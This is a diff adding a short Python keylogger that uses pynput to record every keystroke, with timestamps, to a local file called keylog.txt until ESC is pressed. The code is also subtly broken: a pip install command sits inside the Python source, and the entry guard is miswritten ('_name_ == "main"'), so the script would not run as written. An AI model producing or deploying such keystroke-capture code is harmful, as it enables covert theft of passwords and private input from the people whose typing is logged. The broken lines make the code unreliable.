@@ -1,0 +1,27 @@
+pip install pynput
+
+from pynput import keyboard
+import logging
+
+# Set up logging to a file
+logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s')
+
+def on_press(key):
+    try:
+        logging.info(f'Key pressed: {key.char}')
+    except AttributeError:
+        logging.info(f'Special key pressed: {key}')
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop the listener
+        return False
+
+def main():
+    print("Starting keylogger. Press ESC to stop.")
+    # Set up the listener for keyboard events
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if _name_ == "main":
+    main()
